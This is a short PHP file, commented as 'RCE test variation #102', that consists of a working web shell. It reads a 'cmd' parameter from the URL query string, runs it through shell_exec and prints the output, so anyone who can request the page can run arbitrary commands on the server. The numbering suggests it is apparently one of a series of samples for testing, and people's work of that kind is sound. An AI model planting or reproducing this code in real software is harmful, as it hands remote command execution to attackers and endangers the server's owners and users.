<?php
// RCE test variation #102
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>